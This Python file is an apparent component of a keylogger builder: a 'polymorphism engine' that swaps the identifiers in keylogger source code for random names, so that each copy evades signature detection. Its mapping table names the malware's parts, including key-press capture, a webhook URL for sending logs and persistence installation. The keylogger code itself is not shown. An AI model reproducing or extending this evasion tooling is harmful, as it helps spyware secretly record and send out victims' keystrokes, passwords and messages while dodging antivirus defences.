"""
Polymorphism engine for code obfuscation.
"""

import random
import string
from typing import Dict


class PolymorphismEngine:
    """Handles code polymorphism and obfuscation."""
    
    def __init__(self):
        self.name_mappings = {}
        
    def generate_random_name(self, length: int = 8) -> str:
        """Generate a random identifier name."""
        return ''.join(random.choices(string.ascii_letters, k=length))
        
    def create_name_mappings(self) -> Dict[str, str]:
        """Create random name mappings for identifiers."""
        return {
            'Keylogger': self.generate_random_name(8),
            'log': self.generate_random_name(6),
            'running': self.generate_random_name(7),
            'log_file': self.generate_random_name(8),
            'webhook_url': self.generate_random_name(10),
            'flush_interval': self.generate_random_name(12),
            'flush_thread': self.generate_random_name(11),
            'on_key_press': self.generate_random_name(10),
            'flush_logs': self.generate_random_name(9),
            'flush_thread_worker': self.generate_random_name(15),
            'keylogger_start': self.generate_random_name(12),
            'keylogger_stop': self.generate_random_name(12),
            'install_persistence': self.generate_random_name(16),
            'keylogger': self.generate_random_name(9)
        }
        
    def apply_polymorphism(self, source_code: str) -> str:
        """Apply polymorphism by randomizing identifiers."""
        # Generate random names
        random_names = self.create_name_mappings()
        
        # Protected method names that should not be changed
        protected_methods = {
            'join', 'start', 'stop', 'run', 'sleep', 'clear', 'append',
            'write', 'read', 'open', 'close', 'post', 'get', 'char',
            'str', 'int', 'float', 'list', 'dict', 'tuple', 'set',
            'len', 'print', 'input', 'time', 'datetime', 'threading',
            'keyboard', 'Listener', 'Thread', 'daemon', 'target'
        }
        
        # Replace identifiers, but be careful with method names
        for old_name, new_name in random_names.items():
            # Only replace if it's not a protected method name
            if old_name not in protected_methods:
                # Use word boundaries to avoid partial replacements
                import re
                pattern = r'\b' + re.escape(old_name) + r'\b'
                source_code = re.sub(pattern, new_name, source_code)
            
        return source_code 